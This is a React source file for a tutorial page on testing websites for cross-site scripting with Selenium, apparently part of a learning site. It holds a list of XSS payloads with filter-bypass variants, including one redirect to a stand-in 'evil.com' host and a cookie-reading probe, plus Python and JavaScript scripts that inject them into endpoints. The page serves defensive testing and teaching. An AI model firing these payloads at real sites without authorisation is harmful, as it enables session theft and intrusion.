'use client';

import React, { useState, useEffect } from 'react';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';
import { PageHeader } from '@/components/shared/generic-page-header';
import { TopicNavigation } from '@/components/shared/topic-navigation';
import type { Language, Topic } from '@/data/languages';
import { 
  Code,
  AlertTriangle,
  Shield,
  Bug,
  CheckCircle,
  XCircle,
  Info,
  Copy,
  RefreshCw,
  Scan,
  ShieldCheck,
  Terminal,
  Eye,
  EyeOff,
  Target,
  Lock,
  Globe,
  Smartphone,
  FileText,
  Search,
} from 'lucide-react';

const XSSTesting = () => {
  const [copiedCode, setCopiedCode] = useState<string | null>(null);
  const [isScanning, setIsScanning] = useState(false);
  const [vulnerabilityCount, setVulnerabilityCount] = useState(0);
  const [logs, setLogs] = useState<Array<{ timestamp: string; message: string; type: 'info' | 'success' | 'error' | 'warning' }>>([]);

  // Define the current topic and language for navigation
  const currentTopic: Topic = {
    slug: 'xss-testing',
    title: 'XSS Testing',
    explanation: 'Testing for Cross-Site Scripting vulnerabilities',
    category: '28. Security Testing'
  };

  const language: Language = {
    slug: 'selenium',
    name: 'Selenium',
    description: 'Master the world\'s most powerful browser automation tool',
    topics: []
  };

  const addLog = (message: string, type: 'info' | 'success' | 'error' | 'warning' = 'info') => {
    const timestamp = new Date().toLocaleTimeString();
    setLogs(prev => [...prev, { timestamp, message, type }]);
  };

  const copyToClipboard = async (code: string, codeId: string) => {
    try {
      await navigator.clipboard.writeText(code);
      setCopiedCode(codeId);
      setTimeout(() => setCopiedCode(null), 2000);
      addLog('Code copied to clipboard', 'success');
    } catch (err) {
      addLog('Failed to copy code', 'error');
    }
  };

  const simulateXSSTest = () => {
    setIsScanning(true);
    addLog('Starting XSS vulnerability scan...', 'info');
    setVulnerabilityCount(0);
    
    const testCases = [
      { endpoint: '/search', payload: '<script>alert("XSS")</script>', result: 'Reflected XSS detected' },
      { endpoint: '/comment', payload: '<img src=x onerror=alert("XSS")>', result: 'Stored XSS in comments' },
      { endpoint: '/profile', payload: 'javascript:alert("XSS")', result: 'DOM-based XSS found' },
      { endpoint: '/redirect', payload: 'javascript:alert("XSS")', result: 'XSS in redirect parameter' },
      { endpoint: '/api/data', payload: '<svg onload=alert("XSS")>', result: 'XSS in JSON response' }
    ];

    testCases.forEach((test, index) => {
      setTimeout(() => {
        const isVulnerable = Math.random() > 0.6; // 40% chance of vulnerability
        
        if (isVulnerable) {
          addLog(`🚨 XSS VULNERABILITY: ${test.endpoint} - ${test.result}`, 'error');
          setVulnerabilityCount(prev => prev + 1);
        } else {
          addLog(`✅ SECURE: ${test.endpoint}`, 'success');
        }
        
        if (index === testCases.length - 1) {
          setIsScanning(false);
          addLog(`XSS scan complete! Found ${vulnerabilityCount + (isVulnerable ? 1 : 0)} vulnerabilities`, 'warning');
        }
      }, (index + 1) * 700);
    });
  };

  useEffect(() => {
    addLog('XSS Testing tool ready', 'info');
  }, []);

  const simpleCodeExample = `# Python XSS Testing with Selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
import time

def test_xss_vulnerabilities(driver, base_url):
    """Test for XSS vulnerabilities"""
    xss_payloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '\\";alert(\\"XSS\\");//'
    ]
    
    test_endpoints = [
        '/search?q=',
        '/comment?text=',
        '/profile?name=',
        '/redirect?url='
    ]
    
    vulnerabilities = []
    
    for endpoint in test_endpoints:
        for payload in xss_payloads:
            test_url = base_url + endpoint + payload
            driver.get(test_url)
            time.sleep(2)
            
            # Check if alert is triggered
            try:
                alert = driver.switch_to.alert
                alert.accept()
                vulnerabilities.append({
                    'endpoint': endpoint,
                    'payload': payload,
                    'url': test_url,
                    'type': 'XSS Alert Triggered'
                })
                print(f"XSS found: {endpoint} with payload: {payload}")
                break
            except:
                # Check if payload appears in page source (reflected XSS)
                page_source = driver.page_source
                if payload in page_source and 'script' in payload:
                    vulnerabilities.append({
                        'endpoint': endpoint,
                        'payload': payload,
                        'url': test_url,
                        'type': 'Reflected XSS'
                    })
                    print(f"Reflected XSS found: {endpoint}")
                    break
    
    return vulnerabilities

# Usage
driver = webdriver.Chrome()
vulns = test_xss_vulnerabilities(driver, "https://example.com")
print(f"Found {len(vulns)} XSS vulnerabilities")
driver.quit()`;

  const jsCodeExample = `// JavaScript XSS Testing
const { Builder, By } = require('selenium-webdriver');

async function testXSSVulnerabilities(driver, baseUrl) {
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '\\";alert(\\"XSS\\");//'
    ];
    
    const testEndpoints = [
        '/search?q=',
        '/comment?text=',
        '/profile?name=',
        '/redirect?url='
    ];
    
    const vulnerabilities = [];
    
    for (const endpoint of testEndpoints) {
        for (const payload of xssPayloads) {
            const testUrl = baseUrl + endpoint + encodeURIComponent(payload);
            await driver.get(testUrl);
            await driver.sleep(2000);
            
            // Check if alert is triggered
            try {
                await driver.switchTo().alert();
                await driver.switchTo().alert().accept();
                vulnerabilities.push({
                    endpoint: endpoint,
                    payload: payload,
                    url: testUrl,
                    type: 'XSS Alert Triggered'
                });
                console.log(\`XSS found: \${endpoint} with payload: \${payload}\`);
                break;
            } catch {
                // Check if payload appears in page source (reflected XSS)
                const pageSource = await driver.getPageSource();
                if (pageSource.includes(payload) && payload.includes('script')) {
                    vulnerabilities.push({
                        endpoint: endpoint,
                        payload: payload,
                        url: testUrl,
                        type: 'Reflected XSS'
                    });
                    console.log(\`Reflected XSS found: \${endpoint}\`);
                    break;
                }
            }
        }
    }
    
    return vulnerabilities;
}

// Usage
(async () => {
    const driver = await new Builder().forBrowser('chrome').build();
    const vulns = await testXSSVulnerabilities(driver, 'https://example.com');
    console.log(\`Found \${vulns.length} XSS vulnerabilities\`);
    await driver.quit();
})();`;

  // All XSS Attack Methods
  const xssAttackMethods = [
    {
      title: 'Reflected XSS',
      description: 'Malicious script is reflected off the web server to the victim\'s browser',
      icon: Target,
      payload: '<script>alert("XSS")</script>',
      severity: 'High',
      howItWorks: 'Script is embedded in URL parameters and executed when user clicks malicious link',
      example: 'https://example.com/search?q=<script>alert("XSS")</script>',
      prevention: 'Input validation and output encoding'
    },
    {
      title: 'Stored XSS',
      description: 'Malicious script is permanently stored on the target server',
      icon: FileText,
      payload: '<img src=x onerror=alert("XSS")>',
      severity: 'Critical',
      howItWorks: 'Script is saved in database and executed when other users view the content',
      example: 'Malicious comment in blog post that affects all readers',
      prevention: 'Server-side validation and content security policy'
    },
    {
      title: 'DOM-based XSS',
      description: 'Vulnerability exists in client-side code rather than server-side',
      icon: Globe,
      payload: 'javascript:alert("XSS")',
      severity: 'High',
      howItWorks: 'Script manipulates the DOM to execute malicious code in the browser',
      example: 'URL fragment manipulation: #<script>alert("XSS")</script>',
      prevention: 'Secure JavaScript coding practices and DOM sanitization'
    },
    {
      title: 'Self-XSS',
      description: 'Victim accidentally executes their own malicious script',
      icon: Eye,
      payload: 'javascript:alert(document.cookie)',
      severity: 'Low',
      howItWorks: 'Social engineering tricks user into pasting malicious code in browser console',
      example: 'Copy-paste this code to get free features: javascript:alert("XSS")',
      prevention: 'User education and browser security warnings'
    },
    {
      title: 'Mutation XSS',
      description: 'Browser parser mutates seemingly safe input into executable script',
      icon: RefreshCw,
      payload: '&lt;script&gt;alert("XSS")&lt;/script&gt;',
      severity: 'Medium',
      howItWorks: 'HTML entity encoding is bypassed by browser parser mutations',
      example: 'Encoded entities get decoded and executed by browser',
      prevention: 'Strict content security policy and proper encoding'
    },
    {
      title: 'Universal XSS',
      description: 'XSS that works across multiple websites or browsers',
      icon: Smartphone,
      payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      severity: 'Critical',
      howItWorks: 'Exploits browser vulnerabilities or third-party script dependencies',
      example: 'Compromised CDN script affecting all websites using it',
      prevention: 'Subresource integrity and regular dependency updates'
    }
  ];

  const essentialPayloads = [
    { 
      category: 'Basic Script Injection', 
      payloads: [
        '<script>alert("XSS")</script>',
        '<script>prompt("XSS")</script>',
        '<script>confirm("XSS")</script>'
      ],
      description: 'Direct script tag injection'
    },
    { 
      category: 'Image-based XSS', 
      payloads: [
        '<img src=x onerror=alert("XSS")>',
        '<img src="x" onerror="alert(1)">',
        '<img src="javascript:alert(\'XSS\')">'
      ],
      description: 'Using image tags to trigger XSS'
    },
    { 
      category: 'SVG-based XSS', 
      payloads: [
        '<svg onload=alert("XSS")>',
        '<svg onmouseover=alert("XSS")>',
        '<svg><script>alert("XSS")</script></svg>'
      ],
      description: 'SVG tags with event handlers'
    },
    { 
      category: 'JavaScript Protocol', 
      payloads: [
        'javascript:alert("XSS")',
        'javascript:alert(document.cookie)',
        'javascript:window.location="http://evil.com"'
      ],
      description: 'JavaScript protocol in URLs'
    },
    { 
      category: 'Encoded Payloads', 
      payloads: [
        '%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E',
        '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;',
        '&#60;script&#62;alert(&#34;XSS&#34;)&#60;/script&#62;'
      ],
      description: 'URL and HTML encoded payloads'
    },
    { 
      category: 'Advanced Bypasses', 
      payloads: [
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,34,88,83,83,34,41))</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<body onload=alert("XSS")>'
      ],
      description: 'Techniques to bypass filters'
    }
  ];

  const preventionMethods = [
    {
      title: 'Input Validation',
      description: 'Validate all user input on the server side',
      icon: ShieldCheck,
      example: 'if (!preg_match("/^[a-zA-Z0-9 ]*$/", $input)) { reject(); }'
    },
    {
      title: 'Output Encoding',
      description: 'Encode output based on context (HTML, JS, CSS, URL)',
      icon: Lock,
      example: '&lt;script&gt; becomes &amp;lt;script&amp;gt;'
    },
    {
      title: 'Content Security Policy',
      description: 'Implement CSP headers to restrict script sources',
      icon: Globe,
      example: 'Content-Security-Policy: default-src \'self\''
    },
    {
      title: 'HTTP Headers',
      description: 'Set security headers like X-XSS-Protection',
      icon: Shield,
      example: 'X-XSS-Protection: 1; mode=block'
    }
  ];

  return (
    <div className="w-full px-4 py-8 space-y-8">
      <PageHeader
        title="XSS Testing"
        description="Comprehensive Cross-Site Scripting vulnerability testing with Selenium"
        icon={Bug}
        colorTheme="orange"
      />

      {/* What is XSS */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <AlertTriangle className="w-5 h-5" />
            <span>What is Cross-Site Scripting (XSS)?</span>
          </CardTitle>
          <CardDescription>
            Understanding client-side script injection attacks
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="prose prose-sm max-w-none dark:prose-invert">
            <p className="text-base leading-relaxed">
              <strong>Cross-Site Scripting (XSS)</strong> is a client-side code injection attack where malicious scripts are injected 
              into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send 
              malicious code to a different end user.
            </p>
            
            <div className="bg-orange-50 dark:bg-orange-900/20 border-l-4 border-orange-500 p-4 my-4">
              <p className="text-sm font-medium text-orange-800 dark:text-orange-200">
                🚨 XSS is #3 on OWASP Top 10. It can steal cookies, session tokens, and other sensitive information.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Interactive Scanner */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Scan className="w-5 h-5" />
            <span>XSS Vulnerability Scanner</span>
          </CardTitle>
          <CardDescription>
            Interactive XSS detection tool
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="flex items-center space-x-4">
            <Button
              onClick={simulateXSSTest}
              disabled={isScanning}
              className="flex items-center space-x-2"
            >
              {isScanning ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin" />
                  <span>Scanning...</span>
                </>
              ) : (
                <>
                  <Bug className="w-4 h-4" />
                  <span>Start XSS Scan</span>
                </>
              )}
            </Button>
            <Badge variant={vulnerabilityCount > 0 ? "destructive" : "default"}>
              {vulnerabilityCount} XSS Vulnerabilities Found
            </Badge>
          </div>

          {/* Scan Log */}
          <div className="bg-gray-50 dark:bg-gray-800 rounded-lg p-4 h-48 overflow-y-auto">
            <div className="flex items-center justify-between mb-2">
              <h4 className="font-medium text-sm">Scan Results</h4>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => setLogs([])}
              >
                Clear
              </Button>
            </div>
            <div className="space-y-1">
              {logs.map((log, index) => (
                <div key={index} className="flex items-start space-x-2 text-xs">
                  <span className="text-gray-500 dark:text-gray-400 font-mono">{log.timestamp}</span>
                  <span className={`flex items-center space-x-1 ${
                    log.type === 'success' ? 'text-green-600' : 
                    log.type === 'error' ? 'text-red-600' : 
                    log.type === 'warning' ? 'text-yellow-600' : 'text-blue-600'
                  }`}>
                    {log.type === 'success' && <CheckCircle className="w-3 h-3" />}
                    {log.type === 'error' && <XCircle className="w-3 h-3" />}
                    {log.type === 'warning' && <AlertTriangle className="w-3 h-3" />}
                    {log.type === 'info' && <Info className="w-3 h-3" />}
                    <span>{log.message}</span>
                  </span>
                </div>
              ))}
              {logs.length === 0 && (
                <div className="text-gray-400 dark:text-gray-500 text-center py-4">
                  Click "Start XSS Scan" to begin testing.
                </div>
              )}
            </div>
          </div>
        </CardContent>
      </Card>

      {/* All XSS Attack Methods */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Target className="w-5 h-5" />
            <span>All XSS Attack Methods</span>
          </CardTitle>
          <CardDescription>
            Comprehensive coverage of XSS attack techniques
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
            {xssAttackMethods.map((method, index) => {
              const Icon = method.icon;
              return (
                <div key={index} className="border rounded-lg p-4">
                  <div className="flex items-center space-x-3 mb-3">
                    <Icon className="w-6 h-6 text-orange-600" />
                    <div>
                      <h4 className="font-semibold">{method.title}</h4>
                      <Badge variant={method.severity === 'Critical' ? 'destructive' : 'secondary'} className="text-xs">
                        {method.severity}
                      </Badge>
                    </div>
                  </div>
                  <p className="text-sm text-gray-600 dark:text-gray-300 mb-3">
                    {method.description}
                  </p>
                  <div className="space-y-2">
                    <div>
                      <span className="text-xs font-medium text-blue-600">How it works:</span>
                      <p className="text-xs mt-1">{method.howItWorks}</p>
                    </div>
                    <div>
                      <span className="text-xs font-medium text-blue-600">Example:</span>
                      <p className="text-xs mt-1">{method.example}</p>
                    </div>
                    <div className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                      <code className="text-xs font-mono">{method.payload}</code>
                    </div>
                    <div>
                      <span className="text-xs font-medium text-green-600">Prevention:</span>
                      <p className="text-xs mt-1">{method.prevention}</p>
                    </div>
                  </div>
                </div>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Essential Payloads */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Code className="w-5 h-5" />
            <span>Essential XSS Payloads</span>
          </CardTitle>
          <CardDescription>
            Comprehensive payload collection for testing
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {essentialPayloads.map((category, index) => (
              <div key={index} className="border rounded-lg p-4">
                <h4 className="font-semibold mb-2">{category.category}</h4>
                <p className="text-xs text-gray-600 dark:text-gray-300 mb-3">{category.description}</p>
                <div className="space-y-2">
                  {category.payloads.map((payload, i) => (
                    <div key={i} className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                      <code className="text-xs font-mono">{payload}</code>
                    </div>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </CardContent>
      </Card>

      {/* Simple Code Examples */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Terminal className="w-5 h-5" />
            <span>Simple XSS Testing Code</span>
          </CardTitle>
          <CardDescription>
            Easy-to-implement XSS detection code
          </CardDescription>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="border rounded-lg">
            <div className="bg-gray-50 dark:bg-gray-800 px-4 py-2 border-b flex items-center justify-between">
              <span className="font-medium">Python</span>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => copyToClipboard(simpleCodeExample, 'python')}
              >
                {copiedCode === 'python' ? (
                  <CheckCircle className="w-4 h-4 text-green-600" />
                ) : (
                  <Copy className="w-4 h-4" />
                )}
              </Button>
            </div>
            <pre className="p-4 text-sm overflow-x-auto bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100">
              <code>{simpleCodeExample}</code>
            </pre>
          </div>

          <div className="border rounded-lg">
            <div className="bg-gray-50 dark:bg-gray-800 px-4 py-2 border-b flex items-center justify-between">
              <span className="font-medium">JavaScript</span>
              <Button
                size="sm"
                variant="ghost"
                onClick={() => copyToClipboard(jsCodeExample, 'javascript')}
              >
                {copiedCode === 'javascript' ? (
                  <CheckCircle className="w-4 h-4 text-green-600" />
                ) : (
                  <Copy className="w-4 h-4" />
                )}
              </Button>
            </div>
            <pre className="p-4 text-sm overflow-x-auto bg-gray-100 dark:bg-gray-900 text-gray-900 dark:text-gray-100">
              <code>{jsCodeExample}</code>
            </pre>
          </div>
        </CardContent>
      </Card>

      {/* Prevention Methods */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Shield className="w-5 h-5" />
            <span>XSS Prevention Methods</span>
          </CardTitle>
          <CardDescription>
            How to prevent XSS attacks effectively
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {preventionMethods.map((method, index) => {
              const Icon = method.icon;
              return (
                <div key={index} className="border rounded-lg p-4">
                  <div className="flex items-center space-x-3 mb-3">
                    <Icon className="w-6 h-6 text-green-600" />
                    <h4 className="font-semibold">{method.title}</h4>
                  </div>
                  <p className="text-sm text-gray-600 dark:text-gray-300 mb-3">
                    {method.description}
                  </p>
                  <div className="bg-gray-50 dark:bg-gray-800 p-2 rounded">
                    <code className="text-xs font-mono">{method.example}</code>
                  </div>
                </div>
              );
            })}
          </div>
        </CardContent>
      </Card>

      {/* Important Notes */}
      <Alert>
        <AlertTriangle className="w-4 h-4" />
        <AlertTitle>Important Testing Notes</AlertTitle>
        <AlertDescription>
          <ul className="list-disc list-inside space-y-1 text-sm">
            <li>Only test XSS on applications you own or have permission to test</li>
            <li>Use non-destructive payloads that won't harm users or data</li>
            <li>Test in isolated environments to avoid affecting real users</li>
            <li>Document all findings and follow responsible disclosure practices</li>
            <li>Consider the impact of XSS on user data and session security</li>
          </ul>
        </AlertDescription>
      </Alert>

      <TopicNavigation currentTopic={currentTopic} language={language} />
    </div>
  );
};

export default XSSTesting;
